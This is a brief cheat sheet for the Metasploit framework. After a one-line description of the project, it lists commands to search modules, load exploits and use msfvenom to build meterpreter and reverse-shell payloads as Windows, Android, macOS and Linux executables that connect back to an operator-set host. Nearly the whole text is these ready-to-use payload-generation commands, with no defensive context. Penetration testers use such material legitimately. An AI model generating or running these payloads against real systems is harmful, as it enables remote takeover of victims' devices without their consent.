The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. It is owned by Boston, Massachusetts-based security company Rapid7.

Who to use

Search a module

msf > search [regex]

Create a payload

Windows x64 :
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=[PORT] > filename.exe


Windows x86 :
sudo msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] > filename.exe

Android :
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] > filename.apk

MacOS :
msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=[IP] LPORT=[PORT] -f macho -o filename.bin

Linux :
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=[IP] LPORT=[PORT] -b "\x00" -f elf -o filename

Use an exploit

msf > use exploit/[ExploitPath]
